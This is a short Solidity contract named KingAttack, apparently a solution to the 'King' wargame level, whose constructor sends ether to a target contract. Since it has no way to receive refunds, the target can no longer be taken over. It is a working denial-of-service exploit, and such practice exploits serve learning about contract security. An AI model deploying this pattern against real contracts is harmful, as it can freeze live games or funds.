// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0x96c3071e21334E80645A46bD6D3E3AbFE062B6AF

contract KingAttack {

    constructor(address _king) public payable {
        address(_king).call{value: msg.value}("");
    }

}
